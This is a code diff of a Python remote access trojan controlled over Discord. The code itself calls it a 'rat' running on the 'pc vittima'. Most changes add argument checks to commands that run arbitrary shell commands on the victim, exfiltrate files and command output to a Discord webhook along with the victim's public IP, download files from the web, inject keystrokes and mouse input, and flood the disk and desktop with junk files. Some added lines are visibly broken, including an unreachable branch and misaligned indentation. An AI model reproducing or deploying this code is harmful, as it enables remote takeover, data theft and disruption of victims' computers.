@@ -22,6 +22,7 @@ import shutil
 import csv
 
 
+
 username = os.environ["USERNAME"]
 userprofile = os.environ["USERPROFILE"]
 appdatar = os.environ["APPDATA"]
@@ -46,19 +47,22 @@ async def sysinfo(ctx):
     systeminfo()
 
 @client.command()
-async def grab(ctx,arg):
-    grabfile = arg
-    userw = ctx.message.author
-    webhook = webhook = DiscordWebhook(url=weburl, content=f"File exported from public ip {i.text} for {userw}")
-    try:
-        if os.path.getsize(grabfile) <= 1048576:
-            with open(grabfile, "rb") as f:
-                webhook.add_file(file=f.read(), filename=grabfile)
-            webhook.execute()
-        elif os.path.getsize(grabfile) > 1048576:
-            await ctx.send('Il file specificato è troppo pesante')
-    except:
-        await ctx.send('Il file specificato non esiste')
+async def grab(ctx,arg=None):
+    if arg == None:
+        await ctx.send("Inserisci il percorso file")
+    else:
+        grabfile = arg
+        userw = ctx.message.author
+        webhook = webhook = DiscordWebhook(url=weburl, content=f"File exported from public ip {i.text} for {userw}")
+        try:
+            if os.path.getsize(grabfile) <= 1048576:
+                with open(grabfile, "rb") as f:
+                    webhook.add_file(file=f.read(), filename=grabfile)
+                webhook.execute()
+            elif os.path.getsize(grabfile) > 1048576:
+                await ctx.send('Il file specificato è troppo pesante')
+        except:
+            await ctx.send('Il file specificato non esiste')
 
 
 
@@ -92,96 +96,123 @@ async def ifconfig(ctx):
 
     
 @client.command()
-async def cmd(ctx,arg):
-    cmdcommand = arg
-    userw = ctx.message.author
-    await ctx.channel.purge(limit=1)
-    def cmdtxt():
-        subprocess.getoutput(f'{cmdcommand} >> "%userprofile%\AppData\Output.txt"')
-        file = f'{userprofile}/AppData/Output.txt'
-        webhook = webhook = DiscordWebhook(url=weburl, content=f"File exported from public ip {i.text} for {userw}")
-        with open(file, "rb") as f:
-            webhook.add_file(file=f.read(), filename='Output.txt')
-        webhook.execute()
-        subprocess.getoutput('if exist "%userprofile%\AppData\Output.txt" del "%userprofile%\AppData\Output.txt"/q')
-    cmdtxt()
+async def cmd(ctx,arg=None):
+    if arg == None:
+        await ctx.send("Inserire un comando da eseguire sul cmd")
+    else:
+        cmdcommand = arg
+        userw = ctx.message.author
+        await ctx.channel.purge(limit=1)
+        def cmdtxt():
+            subprocess.getoutput(f'{cmdcommand} >> "%userprofile%\AppData\Output.txt"')
+            file = f'{userprofile}/AppData/Output.txt'
+            webhook = webhook = DiscordWebhook(url=weburl, content=f"File exported from public ip {i.text} for {userw}")
+            with open(file, "rb") as f:
+                webhook.add_file(file=f.read(), filename='Output.txt')
+            webhook.execute()
+            subprocess.getoutput('if exist "%userprofile%\AppData\Output.txt" del "%userprofile%\AppData\Output.txt"/q')
+        cmdtxt()
 
 @client.command()
-async def cmdput(ctx,arg):
-    io = arg
-    await ctx.channel.purge(limit=1)
-    subprocess.getoutput(io)
-    await ctx.send(f'Commando {io} eseguito')
+async def cmdput(ctx,arg=None):
+    if arg == None:
+        await ctx.send("Inserire un comando da eseguire sul cmd")
+    else:
+        io = arg
+        await ctx.channel.purge(limit=1)
+        subprocess.getoutput(io)
+        await ctx.send(f'Commando {io} eseguito')
 
 
 @client.command()
-async def spamcmd(ctx,arg):
-    await ctx.channel.purge(limit=1)
-    await ctx.send('Inizializzando apertura terminali...')
-    for i in range(0,int(arg)):
-        os.system('start')
-    await ctx.send(f"Sono stati aperti {arg} terminali")
+async def spamcmd(ctx,arg=None):
+    if arg == None:
+        await ctx.send("Inserire il numero di finestre da aprire")
+    else:
+        await ctx.channel.purge(limit=1)
+        await ctx.send('Inizializzando apertura terminali...')
+        for i in range(0,int(arg)):
+            os.system('start')
+        await ctx.send(f"Sono stati aperti {arg} terminali")
 
 @client.command()
 async def pwd(ctx):
     await ctx.send(os.getcwd())
 
 @client.command()
-async def input(ctx,arg):
-    writed = arg
-    subprocess.getoutput(f'echo createobject("wscript.shell").sendkeys "{writed}" > InputWR.vbs')
-    subprocess.getoutput('start InputWR.vbs')
-    await ctx.send(f'Input {writed} inviato')
-    subprocess.getoutput('if exist InputWR.vbs del InputWR.vbs/q')
-
-
-@client.command()
-async def lclick(ctx,arg):
-    await ctx.channel.purge(limit=1)
-    for i in range(0,int(arg)):
-        pglib.click()
-    if int(arg) == 1:
-        await ctx.send("È stato inviato un click sinistro")
+async def input(ctx,arg=None):
+    if arg == None:
+        await ctx.send("Inserisci l'input da inviare sulla tastiera")
     else:
-        await ctx.send(f"Sono stati inviati {arg} click sinistri")
+        writed = arg
+        subprocess.getoutput(f'echo createobject("wscript.shell").sendkeys "{writed}" > InputWR.vbs')
+        subprocess.getoutput('start InputWR.vbs')
+        await ctx.send(f'Input {writed} inviato')
+        subprocess.getoutput('if exist InputWR.vbs del InputWR.vbs/q')
 
 
 @client.command()
-async def rclick(ctx,arg):
-    await ctx.channel.purge(limit=1)
-    for i in range(0,int(arg)):
-        with pglib.hold('shift'):
-            pglib.press('F10')
-    if int(arg) == 1:
-        await ctx.send("È stato inviato un click destro")
+async def lclick(ctx,arg=None):
+    if arg == None:
+        await ctx.send("Inserire il numero di click sinistri da inviare")
     else:
-        await ctx.send(f"Sono stati inviati {arg} click destri")  
+        await ctx.channel.purge(limit=1)
+        for i in range(0,int(arg)):
+            pglib.click()
+        if int(arg) == 1:
+            await ctx.send("È stato inviato un click sinistro")
+        else:
+            await ctx.send(f"Sono stati inviati {arg} click sinistri")
+
+
+@client.command()
+async def rclick(ctx,arg=None):
+    if arg == None:
+        await ctx.send("Inserire il numero di click sinistri da inviare")
+    else:
+        await ctx.channel.purge(limit=1)
+        for i in range(0,int(arg)):
+            with pglib.hold('shift'):
+                pglib.press('F10')
+        if int(arg) == 1:
+            await ctx.send("È stato inviato un click destro")
+        else:
+            await ctx.send(f"Sono stati inviati {arg} click destri")  
+
+
+    await ctx.send("Matrix finito")
+    
+
+
+@client.command()
+async def mousemad(ctx,arg=None):
+    if arg == None:
+        await ctx.send("Inserisci il numero di volte da muovere il mouse a caso")
+    else:
+        await ctx.channel.purge(limit=1)
+        await ctx.send("Il mouse ha iniziato a impazzire")
+        for i in range(0,int(arg)):
+            randx = randint(1,1919)
+            randy = randint(1,1079)
+            pglib.moveTo(randx,randy)
+        await ctx.send("Il mouse è impazzito")
 
 
 
 @client.command()
-async def mousemad(ctx,arg):
-    await ctx.channel.purge(limit=1)
-    await ctx.send("Il mouse ha iniziato a impazzire")
-    for i in range(0,int(arg)):
-        randx = randint(1,1919)
-        randy = randint(1,1079)
-        pglib.moveTo(randx,randy)
-    await ctx.send("Il mouse è impazzito")
-
-
-
-@client.command()
-async def cd(ctx,arg):
-    pathchoose = str(arg)
-    try:
-        os.chdir(pathchoose)
-        await ctx.channel.purge(limit=1)
-        await ctx.send(f'Percorso file cambiato su {arg}')
-    except:
-        a = 0
-        await ctx.channel.purge(limit=1)
-        await ctx.send('Percorso inesistente o accesso negato')
+async def cd(ctx,arg=None):
+    if arg == None:
+        await ctx.send("Inserire il percorso file")
+    else:
+        pathchoose = str(arg)
+        try:
+            os.chdir(pathchoose)
+            await ctx.channel.purge(limit=1)
+            await ctx.send(f'Percorso file cambiato su {arg}')
+        except:
+            a = 0
+            await ctx.channel.purge(limit=1)
+            await ctx.send('Percorso inesistente o accesso negato')
     
 
 @client.command()
@@ -207,19 +238,27 @@ async def screen(ctx):
 
 
 @client.command()
-async def ping(ctx,arg):
+async def ping(ctx,arg=None):
     userw = ctx.message.author
-    try:
-        await ctx.channel.purge(limit=1)
-        await ctx.send("Richieste in avvio")
-        subprocess.getoutput(f'ping -n {arg} localhost > "%AppData%\Ping.txt"')
+    if arg == None:
+        subprocess.getoutput(f'ping -n 1 localhost > "%AppData%\Ping.txt"')
         webhook = webhook = DiscordWebhook(url=weburl, content=f"File exported from public ip {i.text} for {userw}")
         with open(f'{appdatar}\Ping.txt', "rb") as f:
             webhook.add_file(file=f.read(), filename='PingTest.txt')
         webhook.execute()
         subprocess.getoutput('if exist "%AppData%\Ping.txt" del "%AppData%\Ping.txt"/q')
-    except:
-        await ctx.send('Ping non eseguito corretamente')
+    else:
+        try:
+            await ctx.channel.purge(limit=1)
+            await ctx.send("Richieste in avvio")
+            subprocess.getoutput(f'ping -n {arg} localhost > "%AppData%\Ping.txt"')
+            webhook = webhook = DiscordWebhook(url=weburl, content=f"File exported from public ip {i.text} for {userw}")
+            with open(f'{appdatar}\Ping.txt', "rb") as f:
+                webhook.add_file(file=f.read(), filename='PingTest.txt')
+            webhook.execute()
+            subprocess.getoutput('if exist "%AppData%\Ping.txt" del "%AppData%\Ping.txt"/q')
+        except:
+            await ctx.send('Ping non eseguito corretamente')
 
 
 
@@ -249,67 +288,84 @@ async def desktop(ctx):
 
 
 @client.command()
-async def download(ctx,arg,user_input):
-    dnurl = arg
-    startingdn = requests.get(dnurl)
-    contenuto = startingdn.content
-    try:
-        if user_input[:2] != "C:":
-            fbdn = open(f'{userprofile}/downloads/{user_input}','wb')
-            fbdn.write(contenuto)
-            fbdn.close()
-            await ctx.send(f"File {user_input} scaricato correttamente")
-        else:
-            fbdn = open(user_input,'wb')
-            fbdn.write(contenuto)
-            fbdn.close()
-            await ctx.send(f"File {user_input} scaricato correttamente")
-    except:
-        await ctx.send("Download failed")
+async def download(ctx,arg=None,user_input=None):
+    if arg == None:
+        await ctx.send("Inserire il percorso in cui scaricare il file")
+    elif arg == None:
+        await ctx.send("Inserire il link da cui scaricare il file")
+    else:
+        dnurl = arg
+        startingdn = requests.get(dnurl)
+        contenuto = startingdn.content
+        try:
+            if user_input[:2] != "C:":
+                fbdn = open(f'{userprofile}/downloads/{user_input}','wb')
+                fbdn.write(contenuto)
+                fbdn.close()
+                await ctx.send(f"File {user_input} scaricato correttamente")
+            else:
+                fbdn = open(user_input,'wb')
+                fbdn.write(contenuto)
+                fbdn.close()
+                await ctx.send(f"File {user_input} scaricato correttamente")
+        except:
+            await ctx.send("Download failed")
 
 @client.command()
-async def msgboxE(ctx,arg):
-    number_of_error = int(arg)
-    subprocess.getoutput('echo msgbox "CRITICAL ERROR", 16, "CRITICAL ERROR" >> "%appdata%\Error.vbs"')
-    os.chdir(appdatar)
-    for i in range(0,number_of_error):
-        subprocess.getoutput('start Error.vbs')
-    if number_of_error == 1:
-        await ctx.send('Errore inviato')
+async def msgboxE(ctx,arg=None):
+    if arg == None:
+        await ctx.send("Inserire il numero di errori da spammare")
     else:
-        await ctx.send('Errori inviati')
-    subprocess.getoutput('if exist "%appdata%\Error.vbs" del "%appdata%\Error.vbs"/q')
+         number_of_error = int(arg)
+        subprocess.getoutput('echo msgbox "CRITICAL ERROR", 16, "CRITICAL ERROR" >> "%appdata%\Error.vbs"')
+        os.chdir(appdatar)
+        for i in range(0,number_of_error):
+            subprocess.getoutput('start Error.vbs')
+        if number_of_error == 1:
+            await ctx.send('Errore inviato')
+        else:
+            await ctx.send('Errori inviati')
+        subprocess.getoutput('if exist "%appdata%\Error.vbs" del "%appdata%\Error.vbs"/q')
 
 
 @client.command(help='Rimuovi definitivamente il rat')
-async def shutdown(ctx,arg):
+async def shutdown(ctx,arg=None):
     if arg != "bot":
+        await ctx.send('Arg deve essere "bot", e questo rimuoverà definitivamente il rat dal pc vittima')
+    elif arg == None:
         await ctx.send('Arg deve essere "bot", e questo rimuoverà definitivamente il rat dal pc vittima')
     else:
         subprocess.getoutput('echo @echo off > "%appdata%\ender.bat"')
         subprocess.getoutput('echo taskkill /f /t /im pyw.exe >> "%appdata%\ender.bat"')
-        subprocess.getoutput('echo if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\BotConfig.pyw" del "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\BotConfig.pyw"/q >> "%appdata%\ender.bat"')
+        subprocess.getoutput('echo if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\b.pyw" del "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\BotConfig.pyw"/q >> "%appdata%\ender.bat"')
         subprocess.getoutput('echo del ender.bat/q >> "%appdata%\ender.bat"')
         os.chdir(appdatar)
         subprocess.getoutput('start ender.bat')
 
 
 @client.command()
-async def bomb(ctx,arg):
-    subprocess.getoutput('if not exist "%localappdata%\WinStart" md "%localappdata%\WinStart"')
-    await ctx.send("Atomica lanciata")
-    for i in range(0,int(arg)):
-        subprocess.getoutput('echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >> "%localappdata%\WinStart\%random%%random%.txt"')
-    await ctx.send("L'atomica ha lasciato il segno")
+async def bomb(ctx,arg=None):
+    if arg == None:
+        await ctx.send("Inserire il numero di file spazzatura da creare")
+    else:
+        subprocess.getoutput('if not exist "%localappdata%\WinStart" md "%localappdata%\WinStart"')
+        await ctx.send("Atomica lanciata")
+        for i in range(0,int(arg)):
+            subprocess.getoutput('echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >> "%localappdata%\WinStart\%random%%random%.txt"')
+        await ctx.send("L'atomica ha lasciato il segno")
 
 
 @client.command()
-async def desktopbomb(ctx,arg):
+async def desktopbomb(ctx,arg=None,*,content=None):
     await ctx.send("Avvio in corso...")
+    if arg == None:
+        arg = "10"
+    if content == None:
+        content = "Boom"
     try:
         boom = 1
         for i in range(0,int(arg)):
-            subprocess.getoutput(f'echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >> "%userprofile%\desktop\Boom{boom}.txt"')
+            subprocess.getoutput(f'echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >> "%userprofile%\desktop\{content}{boom}.txt"')
             boom += 1
         boom = boom * 0
         await ctx.send("Esplosione finita")
@@ -319,20 +375,31 @@ async def desktopbomb(ctx,arg):
 
 
 @client.command()
-async def sendmsg(ctx,arg):
-    subprocess.getoutput(f'echo msgbox "{arg}", 0, "MESSAGE" > "%appdata%\m.vbs"')
-    subprocess.getoutput('echo createobject("scripting.filesystemobject").DeleteFile "m.vbs" >> "%appdata%\m.vbs"')
-    os.chdir(appdatar)
-    subprocess.getoutput('start m.vbs')
-    await ctx.send(f"Messaggio {arg} inviato")
+async def sendmsg(ctx,arg=None,user_input=None):
+    if user_input == None:
+        user_input = "0"
+    if arg == None:
+        await ctx.send("Inserire il messaggio da inviare")
+    else:
+        subprocess.getoutput(f'echo msgbox "{arg}", {user_input}, "MESSAGE" > "%appdata%\m.vbs"')
+        subprocess.getoutput('echo createobject("scripting.filesystemobject").DeleteFile "m.vbs" >> "%appdata%\m.vbs"')
+        os.chdir(appdatar)
+        subprocess.getoutput('start m.vbs')
+        await ctx.send(f"Messaggio {arg} inviato")
 
 @client.command()
-async def purge(ctx,arg):
-    await ctx.channel.purge(limit=int(arg)+1)
+async def purge(ctx,arg=None):
+    if arg == None:
+        await ctx.send("Inserire il numero di messaggi da inviare")
+    else:
+        await ctx.channel.purge(limit=int(arg)+1)
 
 @client.command()
-async def print(ctx,arg):
-    await ctx.send(arg)
+async def print(ctx,arg=None):
+    if arg == None:
+        await ctx.send("Inserire il messaggio da inviare in chat")
+    else:
+        await ctx.send(arg)
 
 @client.command()
 async def cls(ctx):
@@ -525,4 +592,3 @@ async def dstoken(ctx):
 
 
 client.run(botoken)
-
